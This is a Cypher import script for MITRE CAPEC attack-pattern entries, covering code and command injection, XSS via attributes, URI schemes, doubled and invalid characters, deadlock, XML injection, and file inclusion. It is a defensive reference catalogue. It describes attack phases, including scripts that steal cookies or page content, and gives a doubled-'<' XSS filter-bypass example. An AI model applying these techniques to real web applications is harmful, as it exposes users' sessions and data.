CREATE (:AttackPattern{id: 241, name: "DEPRECATED: Code Injection", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Hook"});
CREATE (:Submission{id: 222});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 177});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 178});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description, Description Summary"});
CREATE (:PreviousEntryName{id: 49, name: "Code Injection"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 219, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of the existing attack pattern \"CAPEC-242 : Code Injection\". Please refer to this other CAPEC going forward.')])"});
CREATE (:AttackPattern{id: 242, name: "Code Injection", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 201, text: "<div level=\"0\">\n  <p class=\"text\">The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.</p>\n</div>"});
CREATE (:Submission{id: 223});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 179});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 220, summary: "OrderedDict([('Text', 'An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.')])"});
MERGE (:CWE{id: 74});
CREATE (:AttackPattern{id: 243, name: "XSS Targetting HTML Attributes", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 202, text: "<div level=\"0\">\n  <p class=\"text\">The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.</p>\n</div>"});
CREATE (:Submission{id: 224});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 180});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 50, name: "Cross-Site Scripting in Attributes"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 221, summary: "OrderedDict([('Text', 'An adeversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.')])"});
MERGE (:Reference{local_id: "R.243.1", author: "Jeremiah Grossman", title: "Attribute-Based Cross-Site Scripting", link: "http://jeremiahgrossman.blogspot.com/2007/07/attribute-based-cross-site-scripting.html"});
MERGE (:CWE{id: 83});
CREATE (:ResourcesRequired{id: 129, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.</p>\n</div>"});
CREATE (:AttackPattern{id: 244, name: "XSS Targeting URI Placeholders", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 203, text: "<div level=\"0\">\n  <p class=\"text\">Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.</p>\n</div>"});
CREATE (:Submission{id: 225});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 181});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 51, name: "Cross-Site Scripting via Encoded URI Schemes"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 222, summary: "OrderedDict([('Text', 'An attack of this type exploits the ability of most browsers to interpret \"data\", \"javascript\" or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the application", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">URL parameters are used by the application or the browser (DOM) in a context that is originally used for storing URL (anchor's \"href\", script's \"src\", etc.)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt injection payload variations on input parameters", description: "<div level=\"0\">\n  <p class=\"text\">Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of manual input of XSS probes in known URLs.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Input parameters are printed back in a URL placeholder that support different URI schemes such as HREF, SRC, and other attributes</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Nothing is returned to the web page. The payload may be a stored to be served later. The unique identifier from the probe helps to trace the flow of the possible XSS</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's cross-site scripting string is included in the URI scheme content and can be triggered by a user (a victim in this case)."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Custom URI scheme aren't allowed by the application"});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "Some sensitive characters are consistently encoded, but others are not"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Steal session IDs, credentials, page content, etc.", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the user's cookies or other session identifiers."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker gets the content of the page the user is viewing."});
CREATE (:Outcome{id: 3, type: "Success", description: "The attacker causes the user's browser to visit a page with malicious content."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Forceful browsing", description: "<div level=\"0\">\n  <p class=\"text\">When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker indirectly controls the user's browser and makes it performing actions exploiting CSRF."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker manipulates the browser through the steps that he designed in his attack. The user, identified on a website, is now performing actions he is not aware of."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Content spoofing", description: "<div level=\"0\">\n  <p class=\"text\">By manipulating the content, the attacker targets the information that the user would like to get from the website</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The user sees a page containing wrong information"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
MERGE (:Reference{id: "REF-4", local_id: "R.244.1", title: "OWASP Testing Guide", section: "Testing for Cross site scripting", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Testing_for_Cross_site_scripting"});
MERGE (:Reference{local_id: "R.244.2", title: "Google Cross-Site Scripting HOWTO article", publisher: "Google", link: "http://code.google.com/p/doctype/wiki/ArticleXSSInUrlAttributes"});
MERGE (:Reference{id: "REF-9", local_id: "R.244.3", title: "OWASP Cheatsheets", section: "XSS Filter Evasion Cheat Sheet", publisher: "The Open Web Application Security Project (OWASP)", link: "http://ha.ckers.org/xss.html"});
MERGE (:Reference{id: "REF-1", local_id: "R.244.4", title: "WASC Threat Classification 2.0", section: "WASC-08 - Cross Site Scripting", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Cross-Site+Scripting"});
MERGE (:CWE{id: 84});
CREATE (:ResourcesRequired{id: 130, text: "<div level=\"0\">\n  <p class=\"text\">Ability to send HTTP request to a web application</p>\n</div>"});
CREATE (:AttackPattern{id: 245, name: "XSS Using Doubled Characters", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 204, text: "<div level=\"0\">\n  <p class=\"text\">The targeted web application does not fully normalize input before checking for prohibited syntax. In particular, it must fail to recognize prohibited methods preceded by certain sequences of repeated characters.</p>\n</div>"});
CREATE (:Submission{id: 226});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 182});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 52, name: "Cross-Site Scripting Using Doubled Characters, e.g. %3C%3Cscript"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 223, summary: "OrderedDict([('Text', 'The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.')])"});
MERGE (:Reference{local_id: "R.245.1", author: "Matteo Carli", title: "XSS and CSRF vulnerability on Cpanel", publisher: "SecurityFocus", pubdate: "May 9, 2008", link: "http://www.securityfocus.com/archive/1/archive/1/491864/100/0/threaded"});
CREATE (:CVE{id: "CVE-2008-2070", description: "<div level=\"0\">\n  <p class=\"text\">The WHM interface 11.15.0 for cPanel 11.18 before 11.18.4 and 11.22 before 11.22.3 allows remote attackers to bypass XSS protection and inject arbitrary script or HTML via repeated, improperly-ordered \"<\" and \">\" characters in the (1) issue parameter to scripts2/knowlegebase, (2) user parameter to scripts2/changeip, (3) search parameter to scripts2/listaccts, and other unspecified vectors.</p>\n</div>"});
MERGE (:CWE{id: 85});
CREATE (:ResourcesRequired{id: 131, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.</p>\n</div>"});
CREATE (:AttackPattern{id: 246, name: "DEPRECATED: XSS Using Flash", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Hook"});
CREATE (:Submission{id: 227});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 183});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases, Description, Description Summary, Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 53, name: "Cross-Site Scripting Using Flash"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 224, summary: "OrderedDict([('Text', 'This pattern has been deprecated as it is covered by a chaining relationship between CAPEC-174: Flash Parameter Injection and CAPEC-591: Stored XSS. Please refer to these CAPECs going forward.')])"});
CREATE (:AttackPattern{id: 247, name: "XSS Using Invalid Characters", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 205, text: "<div level=\"0\">\n  <p class=\"text\">The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters.</p>\n</div>"});
CREATE (:Submission{id: 228});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 184});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 54, name: "Cross-Site Scripting with Masking through Invalid Characters in Identifiers"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 225, summary: "OrderedDict([('Text', 'An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.')])"});
MERGE (:CWE{id: 86});
CREATE (:ResourcesRequired{id: 132, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required.</p>\n</div>"});
CREATE (:AttackPattern{id: 248, name: "Command Injection", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 206, text: "<div level=\"0\">\n  <p class=\"text\">The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases, this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.</p>\n</div>"});
CREATE (:Submission{id: 229});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 185});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description, Description Summary, Solutions_and_Mitigations"});
CREATE (:Modification{id: 186});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 226, summary: "OrderedDict([('Text', 'An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.')])"});
MERGE (:CWE{id: 77});
CREATE (:AttackPattern{id: 249, name: "Linux Terminal Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 230});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 227, summary: "OrderedDict([('Text', 'This type of attack exploits terminal devices that allow the keyboard buffer to be written to by other users.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.249.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
CREATE (:AttackPattern{id: 25, name: "Forced Deadlock", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 207, text: "<div level=\"0\">\n  <p class=\"text\">The target host has a deadlock condition. There are four conditions for a deadlock to occur, known as the Coffman conditions. [R.25.3][REF-6]</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 208, text: "<div level=\"0\">\n  <p class=\"text\">The target host exposes an API to the user.</p>\n</div>"});
CREATE (:Submission{id: 231});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 187});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns, Type (Relationship -> Attack_Pattern)"});
CREATE (:Modification{id: 188});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Phases, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Probing_Techniques, Related_Weaknesses, Solutions_and_Mitigations"});
CREATE (:Description{id: 228, summary: "OrderedDict([('Text', 'The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The adversary initiates an exploratory phase to get familiar with the system.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.25.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.25.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-412 - Unrestricted Critical Resource Lock", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/412.html"});
MERGE (:Reference{id: "REF-6", local_id: "R.25.3", title: "Wikipedia", section: "Deadlock", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Deadlock"});
MERGE (:CWE{id: 412});
MERGE (:CWE{id: 567});
MERGE (:CWE{id: 662});
MERGE (:CWE{id: 833});
MERGE (:CWE{id: 667});
CREATE (:AttackPattern{id: 250, name: "XML Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 209, text: "<div level=\"0\">\n  <p class=\"text\">XML queries used to process user input and retrieve information stored in XML documents</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 210, text: "<div level=\"0\">\n  <p class=\"text\">User-controllable input not properly sanitized</p>\n</div>"});
CREATE (:Submission{id: 232});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 229, summary: "OrderedDict([('Text', 'An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey Application"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spider web sites for all available links.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Gather results for analysis via responses or network sniffing.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one data input to application identified."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No inputs to application identified, although this does not mean the application will not accept any."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Test user-controllable inputs for injection"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives an error message from server indicating that there was a problem with the SQL query.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one user-controllable input susceptible to injection found."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No user-controllable input susceptible to injection found."});
MERGE (:Reference{id: "REF-3", local_id: "R.250.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-91 - XML Injection", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/91.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.250.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.250.3", title: "Common Weakness Enumeration (CWE)", section: "CWE-390 - Improper Error Handling", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/390.html"});
MERGE (:CWE{id: 91});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 390});
MERGE (:CWE{id: 713});
MERGE (:CWE{id: 707});
CREATE (:ResourcesRequired{id: 134, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 251, name: "Local Code Inclusion", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 211, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must have a bug that allows an attacker to control which code file is loaded at some juncture.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 212, text: "<div level=\"0\">\n  <p class=\"text\">Some variants of this attack may require that old versions of some code files be present and in predictable locations.</p>\n</div>"});
CREATE (:Submission{id: 233});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 189});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 230, summary: "OrderedDict([('Text', 'The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.')])"});
MERGE (:Reference{local_id: "R.251.1", author: "ATT&CK Project", title: "DLL Injection (1055)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/DLL_injection"});
CREATE (:CVE{id: "CVE-2009-0932", description: "<div level=\"0\">\n  <p class=\"text\">Directory traversal vulnerability in framework/Image/Image.php in Horde before 3.2.4 and 3.3.3 and Horde Groupware before 1.1.5 allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the Horde_Image driver name.</p>\n</div>"});
CREATE (:ResourcesRequired{id: 135, text: "<div level=\"0\">\n  <p class=\"text\">The attacker needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.</p>\n</div>"});
CREATE (:AttackPattern{id: 252, name: "PHP Local File Inclusion", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 213, text: "<div level=\"0\">\n  <p class=\"text\">The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture.</p>\n</div>"});
CREATE (:Submission{id: 234});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 231, summary: "OrderedDict([('Text', 'The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.')])"});
CREATE (:CVE{id: "CVE-2009-0932", description: "<div level=\"0\">\n  <p class=\"text\">Directory traversal vulnerability in framework/Image/Image.php in Horde before 3.2.4 and 3.3.3 and Horde Groupware before 1.1.5 allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the Horde_Image driver name.</p>\n</div>"});
CREATE (:ResourcesRequired{id: 136, text: "<div level=\"0\">\n  <p class=\"text\">The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.</p>\n</div>"});
CREATE (:AttackPattern{id: 253, name: "Remote Code Inclusion", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Hook"});
CREATE (:Submission{id: 235});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 232, summary: "OrderedDict([('Text', 'The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the remote machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.')])"});
CREATE (:AttackPattern{id: 254, name: "DEPRECATED: DTD Injection in a SOAP Message", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 236});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 190});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description, Description Summary, Related_Attack_Patterns"});
